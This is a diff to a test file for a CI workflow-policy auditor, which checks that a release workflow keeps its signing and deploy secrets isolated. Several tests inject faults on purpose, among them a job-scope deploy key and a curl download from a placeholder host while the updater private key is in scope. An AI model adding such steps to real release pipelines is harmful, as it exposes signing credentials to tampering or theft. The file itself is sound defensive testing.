@@ -18,13 +18,6 @@ function diagnosticIdentities(source) {
   );
 }
 
-test("accepts a well-formed workflow policy input", () => {
-  assert.deepEqual(
-    auditWorkflowPolicy("name: Example\njobs:\n  verify:\n    runs-on: ubuntu-24.04\n"),
-    [],
-  );
-});
-
 test("rejects empty, malformed, and non-mapping workflow inputs", () => {
   for (const [source, message] of [
     ["", "workflow source must be non-empty text"],
@@ -38,41 +31,61 @@ test("rejects empty, malformed, and non-mapping workflow inputs", () => {
   }
 });
 
-test("reports the current release workflow's credential-boundary violations", () => {
-  assert.deepEqual(diagnosticIdentities(releaseWorkflow), [
-    "apple-secret-window:apple_sign:Apply preview ad-hoc or fail-closed stable Apple signing",
-    "environment-boundary:build:job",
-    "updater-secret-window:sign_updater_preview:Sign and collect the preview payload",
-    "updater-secret-window:sign_updater_stable:Sign and collect the stable payload",
-  ]);
+test("accepts the release workflow's isolated credential boundaries", () => {
+  assert.deepEqual(diagnosticIdentities(releaseWorkflow), []);
 });
 
-test("reports repository secrets at job scope and updater network work", () => {
-  const hostile = `
-name: Hostile
-jobs:
-  build:
-    runs-on: ubuntu-24.04
-    env:
-      SOURCE_KEY: \${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}
-    steps:
-      - run: git fetch origin main
-  sign_updater_preview:
-    runs-on: ubuntu-24.04
-    environment: preview
-    steps:
-      - name: Sign candidate
-        env:
-          TAURI_PRIVATE_KEY: \${{ secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY }}
-          TAURI_PRIVATE_KEY_PASSWORD: \${{ secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
-        run: |
-          npm exec --offline -- tauri signer sign release-input/ZergLang.app.tar.gz
-          curl https://example.invalid/verifier.tar.gz --output verifier.tar.gz
-`;
-
+test("reports secrets at job scope and a missing source environment", () => {
+  const hostile = releaseWorkflow
+    .replace("    environment: zerglang-source-read\n", "")
+    .replace(
+      "      CARGO_TERM_COLOR: always",
+      "      SOURCE_KEY: \${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}\n" +
+        "      CARGO_TERM_COLOR: always",
+    );
   assert.deepEqual(diagnosticIdentities(hostile), [
     "environment-boundary:build:job",
     "job-secret-scope:build:job",
-    "updater-secret-window:sign_updater_preview:Sign candidate",
+  ]);
+});
+
+test("reports updater work while its private key is in scope", () => {
+  const hostile = releaseWorkflow.replace(
+    "          unset TAURI_PRIVATE_KEY TAURI_PRIVATE_KEY_PASSWORD",
+    "          curl https://example.invalid/verifier.tar.gz --output verifier.tar.gz\n" +
+      "          unset TAURI_PRIVATE_KEY TAURI_PRIVATE_KEY_PASSWORD",
+  );
+  assert.deepEqual(diagnosticIdentities(hostile), [
+    "updater-secret-window:sign_updater_preview:Sign only the preview updater archive",
+  ]);
+});
+
+test("reports the wrong channel signer mapping", () => {
+  const hostile = releaseWorkflow.replace(
+    "secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
+    "secrets.ZERGLANG_STABLE_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
+  );
+  assert.deepEqual(diagnosticIdentities(hostile), [
+    "updater-credential-contract:sign_updater_preview:Sign only the preview updater archive",
+  ]);
+});
+
+test("reports an unpinned action, mutable publication, and synthetic dispatch", () => {
+  const unpinned = releaseWorkflow.replace(
+    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+    "actions/checkout@v7",
+  );
+  assert.deepEqual(diagnosticIdentities(unpinned), [
+    "unpinned-action:validate:uses actions/checkout@v7",
+  ]);
+
+  const mutable = releaseWorkflow.replace("--draft=false", "--draft=true");
+  assert.deepEqual(diagnosticIdentities(mutable), [
+    "job-contract:publish:job",
+  ]);
+
+  const synthetic = releaseWorkflow.replace("      request_file:", "      channel:");
+  assert.deepEqual(diagnosticIdentities(synthetic), [
+    "trigger-contract:workflow:job",
   ]);
 });
